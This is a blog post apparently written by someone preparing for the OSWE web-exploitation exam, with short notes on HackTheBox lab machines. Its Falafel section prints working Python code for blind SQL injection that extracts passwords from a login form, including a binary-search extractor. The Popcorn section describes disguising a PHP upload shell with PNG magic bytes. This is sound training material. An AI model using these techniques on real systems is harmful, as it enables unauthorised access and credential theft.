---
layout: post
title: OSWE preparation
date: 2023-12-23 10:14:00-0400
description: My OSWE examination preparation 
tags: preparation offsec oswe web
categories: cheetsheet
giscus_comments: true
related_posts: false
toc:
  sidebar: left
---

{% include figure.html path="assets/img/posts/oswe_preparation/oswe_introduction.jpg" title="oswe_preparation" class="img-fluid rounded z-depth-1" %}

### Introduction

{:data-toc-text="Introduction"}
Start of preparation for [OSWE](https://www.offsec.com/courses/web-300/) exam from OffSec :)\
Wanna blog my progress to preparations - share links, progress, minds about and e.t.c

---

### Сollecting material to study
{:data-toc-text="Material"}

For first, wanted to get information about exam format, people opinion who passed, found couple of pages:
* [Как я OSWE сдавал](https://habr.com/ru/companies/pm/articles/733170/)
* [Becoming a web security expert](https://habr.com/ru/companies/angarasecurity/articles/595071/)
* [An honest OSWE 2023 review](https://charchitverma100.medium.com/an-honest-oswe-2023-review-my-journey-preparation-and-exam-67d0adcbcde4)


After, i started to search technical material to prepare exam.\
There is [google table](https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=665299979) with HackTheBox machines which can improve my skill for OSWE exam. IDK what these machines contain, i plan to solve and describe it later, when it be a christmas holidays. And take notes about all whitebox pentesting moments in these machines.

{% include figure.html path="assets/img/posts/oswe_preparation/htb_machines_table.png" title="oswe_preparation" class="img-fluid rounded z-depth-1" %}

There are machines i've decided to solve and write some descriptions:
* Blocky (Easy) 
* Help (Easy)
* Popcorn (Medium)
* Falafel (Hard)

Also, was found a nice [link](https://github.com/snoopysecurity/OSWE-Prep) that can be used too.

---
 
### HTB Machines
Next are reviews of hackthebox labs which have some OSWE-like challanges. I'm not going to describe every machine with full write up, I only notice key moments.


#### Blocky
Simply, dowload JD-GUI and explore couple of jar-files, located in [http://blocky.htb/plugins/](http://blocky.htb/plugins/).

JD-GUI is a standalone graphical utility that displays Java source codes of ".class" files. You can browse the reconstructed source code with the JD-GUI for instant access to methods and fields.

{% include figure.html path="assets/img/posts/oswe_preparation/blocky_jd_gui.png" title="oswe_preparation" class="img-fluid rounded z-depth-1" %}


#### Help
SQL injection in 1.0.2 of HelpDeskZ - free PHP based software which allows to manage site's support with a web-based support ticket system.

Exploit-db have a Python-version [exploit](https://www.exploit-db.com/exploits/41200) for that CVE, but i've decided to create my own, Golang version, only for practice.

Here is [link](https://github.com/MikeDakotaStayTrue/Script4You/blob/main/helpdeskz_sqli_exploit.go) to my GitHub. Some coding was interesting and useful, that was my first full script on Golang.

{% include figure.html path="assets/img/posts/oswe_preparation/help_sqli.png" title="oswe_preparation" class="img-fluid rounded z-depth-1" %}


#### Popcorn
Simple task to create PHP-shell for uploading, but bypassing some restrictions via injecting image magic bytes in shell. My choice was PNG.

{% include figure.html path="assets/img/posts/oswe_preparation/popcorn_png.png" title="oswe_preparation" class="img-fluid rounded z-depth-1" %}

Most cofortable for that task was Python, by my opinion, here is [link](https://github.com/MikeDakotaStayTrue/Script4You/blob/main/upload_php_png.py) to script.

#### Falafel
Here was Blind SQLi in the login form, where we could extract some passwords. I have wasted some time on script creation. The task was simple, but it was an annoying error that I couldn't understand while working with prepared requests in Python.

Next situation: for SQLi, I needed to send my body in POST request without URL-encoding, since that is the default behavior. But I found a way to bypass it by using prepared requests.

I have not found much practical information about using it, and finding errors myself is waiting for me.

Prepared statemets allow to change body after creating a request, but HTTP-header Content-length will not be updated. I didn't know it.


Final piece of code to send URL-decoded body:

```python
...
  sql_string = "admin'+and+ASCII(SUBSTRING(password,{},1))={}--+-".format(indx, chr_)
  data = {'username': sql_string, 'password':'pass'}

  req = requests.Request('POST', lab_url, data=data)
  
  prep = session.prepare_request(req)
  prep.body = urllib.parse.unquote(prep.body)
  prep.headers['Content-length'] = len(prep.body)

  resp = session.send(prep)
...
```

It's better to binary search instead of O(N), but im lazy. Here is proof of dupmping all tables:

{% include figure.html path="assets/img/posts/oswe_preparation/falafel_sqli_tables.png" title="oswe_preparation" class="img-fluid rounded z-depth-1" %}

UPD, added function for binary search О(logN) - maybe will use it as basement for future tasks:

```python
def binary_extract_passwords():
    password = ""

    for indx in range(1, 40):
        left = 47
        right = 123

        while left <= right:
            cursor = left + (right - left) // 2

            # Check cursor (middle)
            sql_string = "admin'+and+ASCII(SUBSTRING(password,{},1))={}--+-".format(indx, cursor)
            resp = send_request(sql_string)

            if "Wrong identification" in resp.text:
                password = password + chr(cursor)
                break

            # Сheck sides
            sql_string = "admin'+and+ASCII(SUBSTRING(password,{},1))>{}--+-".format(indx, cursor)
            resp = send_request(sql_string)

            if "Wrong identification" in resp.text:
                left = cursor + 1
            else:
                right = cursor - 1
    print(password)
```

And [link](https://github.com/MikeDakotaStayTrue/Script4You/blob/main/blind_sqli_extractor.py) to my script.

{% include figure.html path="assets/img/posts/oswe_preparation/falafel_sqli_pass.png" title="oswe_preparation" class="img-fluid rounded z-depth-1" %}

<br/><br/>

### Buying WEB-300
In middle of January 2024, my company bought me the course for my own account.
{% include figure.html path="assets/img/posts/oswe_preparation/web300.png" title="oswe_preparation" class="img-fluid rounded z-depth-1" %}

### Passing exam
(Names when buying and passing exam are different, because i forgot i have another name in international passport lol)
{% include figure.html path="assets/img/posts/oswe_preparation/pass_exam.jpg" title="pass_exam" class="img-fluid rounded z-depth-1" %}

---